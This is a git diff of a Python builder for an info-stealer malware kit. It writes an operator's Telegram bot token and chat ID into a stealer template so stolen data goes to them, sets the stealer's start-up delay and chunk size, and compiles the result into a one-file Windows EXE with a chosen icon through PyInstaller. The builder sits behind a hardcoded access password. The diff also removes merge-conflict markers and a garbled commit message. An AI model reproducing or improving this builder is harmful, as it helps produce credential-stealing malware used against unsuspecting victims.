@@ -11,7 +11,7 @@ from pathlib import Path
 STEALER_DIR = os.path.dirname(os.path.abspath(__file__))
 OUTPUT_DIR = os.path.join(STEALER_DIR, "..", "dist")
 BASE_STEALER = os.path.join(STEALER_DIR, "..", "stealer.py")
-PASSWORD = "@xillenadapter"  # Пароль для доступа к билдеру V4.0
+PASSWORD = "@xillenadapter"
 
 def read_stealer_base():
     try:
@@ -22,13 +22,11 @@ def read_stealer_base():
 
 def modify_config(code, config):
     try:
-        # Заменяем токены в формате: self.TG_BOT_TOKEN = os.environ.get('TG_BOT_TOKEN', 'YOUR_BOT_TOKEN')
         code = code.replace("'YOUR_BOT_TOKEN'", f"'{config['token']}'")
         code = code.replace("'YOUR_CHAT_ID'", f"'{config['chat_id']}'")
         code = code.replace('self.SLEEP_BEFORE_START = random.randint(5, 30)', f'self.SLEEP_BEFORE_START = {config["sleep_time"]}')
         code = code.replace('self.CHUNK_SIZE = 1024 * 1024', f'self.CHUNK_SIZE = {config["chunk_size"]}')
         
-        # Add Telegram language support
         telegram_lang = config.get("telegram_language", "ru")
         code = code.replace('self.TELEGRAM_LANGUAGE = "ru"', f'self.TELEGRAM_LANGUAGE = "{telegram_lang}"')
         
@@ -56,25 +54,17 @@ def save_build(name, code):
 
 def compile_to_exe(py_path, name, icon_path=None):
     try:
-<<<<<<< HEAD
-        spec_content = f"""
-# -*- mode: python ; coding: utf-8 -*-
-=======
-        # Normalize paths for PyInstaller
         normalized_py_path = os.path.abspath(py_path).replace('\\', '/')
         normalized_dist = os.path.abspath(OUTPUT_DIR).replace('\\', '/')
         
-        # Handle icon path
         icon_param = None
         if icon_path and os.path.exists(icon_path):
-            # Normalize icon path for PyInstaller spec file
             normalized_icon = os.path.abspath(icon_path).replace('\\', '/')
             icon_param = f"'{normalized_icon}'"
         else:
             icon_param = 'None'
         
         spec_content = f"""# -*- mode: python ; coding: utf-8 -*-
->>>>>>> 6fd021e (Fix: РСЃРїСЂР°РІР»РµРЅР° РєРѕРјРїРёР»СЏС†РёСЏ EXE СЃ РёРєРѕРЅРєРѕР№, РґРѕР±Р°РІР»РµРЅС‹ РЅР°Р·РѕР№Р»РёРІС‹Рµ Р±Р°РЅРЅРµСЂС‹ V5.0, РёСЃРїСЂР°РІР»РµРЅ РїР°СЂРѕР»СЊ)
 block_cipher = None
 
 a = Analysis(
@@ -130,37 +120,26 @@ exe = EXE(
     target_arch=None,
     codesign_identity=None,
     entitlements_file=None,
-<<<<<<< HEAD
-    icon={repr(icon_path) if icon_path else 'None'},
-    distpath={repr(OUTPUT_DIR)},
-    onefile=True,
-)
-"""
-=======
     icon={icon_param},
     distpath='{normalized_dist}',
     onefile=True,
     uac_admin=False,
 )"""
->>>>>>> 6fd021e (Fix: РСЃРїСЂР°РІР»РµРЅР° РєРѕРјРїРёР»СЏС†РёСЏ EXE СЃ РёРєРѕРЅРєРѕР№, РґРѕР±Р°РІР»РµРЅС‹ РЅР°Р·РѕР№Р»РёРІС‹Рµ Р±Р°РЅРЅРµСЂС‹ V5.0, РёСЃРїСЂР°РІР»РµРЅ РїР°СЂРѕР»СЊ)
         builds_dir = os.path.join(os.path.dirname(OUTPUT_DIR), "builds")
         os.makedirs(builds_dir, exist_ok=True)
         spec_path = os.path.join(builds_dir, f"{name}.spec")
         with open(spec_path, "w", encoding="utf-8") as f:
             f.write(spec_content)
         
-        # Ensure PyInstaller is installed
         try:
             import PyInstaller.__main__ as pyi_main
         except ImportError:
             return False, ["PyInstaller не установлен. Установите: pip install pyinstaller"]
         
-        # Use absolute paths
         abs_spec_path = os.path.abspath(spec_path)
         abs_dist_path = os.path.abspath(OUTPUT_DIR)
         abs_build_path = os.path.abspath(os.path.join(os.path.dirname(OUTPUT_DIR), "build"))
         
-        # PyInstaller command
         cmd = [
             'pyinstaller',
             abs_spec_path,
@@ -188,13 +167,11 @@ exe = EXE(
         
         returncode = process.returncode
         
-        # Check for EXE in dist folder (PyInstaller creates it directly there)
         dist_exe_path = os.path.join(abs_dist_path, f"{name}.exe")
         
         if returncode == 0 and os.path.exists(dist_exe_path):
             output_lines.append(f"✓ EXE успешно создан: {dist_exe_path}")
             
-            # Clean up build directory and spec file
             try:
                 if os.path.exists(abs_build_path):
                     shutil.rmtree(abs_build_path)
@@ -205,7 +182,6 @@ exe = EXE(
             
             return True, output_lines
         else:
-            # Try to find EXE in alternative location
             alt_exe_path = os.path.join(abs_build_path, name, f"{name}.exe")
             if os.path.exists(alt_exe_path):
                 try:
@@ -259,22 +235,17 @@ def get_statistics():
         return {'total_builds': 0, 'total_size_mb': 0, 'py_files': 0, 'exe_files': 0}
 
 def check_password(password):
-    """Проверка пароля - поддерживает прямой пароль"""
     if not password:
         return False
     
-    # Убираем пробелы и нормализуем
     password = password.strip()
     
-    # Прямое сравнение пароля
     if password == PASSWORD:
         return True
     
-    # Также принимаем без @ символа
     if password == PASSWORD.lstrip('@'):
         return True
     
-    # Сравнение без учета регистра (на всякий случай)
     if password.lower() == PASSWORD.lower():
         return True
     
@@ -295,16 +266,19 @@ def main():
                 if cmd == 'check_password':
                     result = check_password(params.get('password', ''))
                     print(json.dumps({'status': 'ok', 'result': result}))
+                    sys.stdout.flush()
                 
                 elif cmd == 'build':
                     code = read_stealer_base()
                     if not code:
                         print(json.dumps({'status': 'error', 'message': 'Stealer base not found'}))
+                        sys.stdout.flush()
                         continue
                     
                     modified_code = modify_config(code, params)
                     output_path = save_build(params['name'], modified_code)
                     print(json.dumps({'status': 'ok', 'path': output_path}))
+                    sys.stdout.flush()
                 
                 elif cmd == 'compile':
                     py_path = params.get('path')
@@ -313,30 +287,38 @@ def main():
                     
                     if not py_path or not name:
                         print(json.dumps({'status': 'error', 'output': ['Отсутствуют обязательные параметры: path или name']}))
+                        sys.stdout.flush()
                         continue
                     
                     if not os.path.exists(py_path):
                         print(json.dumps({'status': 'error', 'output': [f'Файл не найден: {py_path}']}))
+                        sys.stdout.flush()
                         continue
                     
                     success, output = compile_to_exe(py_path, name, icon_path)
                     print(json.dumps({'status': 'ok' if success else 'error', 'output': output}))
+                    sys.stdout.flush()
                 
                 elif cmd == 'get_builds':
                     builds = get_builds_list()
                     print(json.dumps({'status': 'ok', 'builds': builds}))
+                    sys.stdout.flush()
                 
                 elif cmd == 'get_stats':
                     stats = get_statistics()
                     print(json.dumps({'status': 'ok', 'stats': stats}))
+                    sys.stdout.flush()
                 
                 else:
                     print(json.dumps({'status': 'error', 'message': 'Unknown command'}))
+                    sys.stdout.flush()
                     
             except json.JSONDecodeError:
                 print(json.dumps({'status': 'error', 'message': 'Invalid JSON'}))
+                sys.stdout.flush()
             except Exception as e:
                 print(json.dumps({'status': 'error', 'message': str(e)}))
+                sys.stdout.flush()
                 
     except KeyboardInterrupt:
         pass
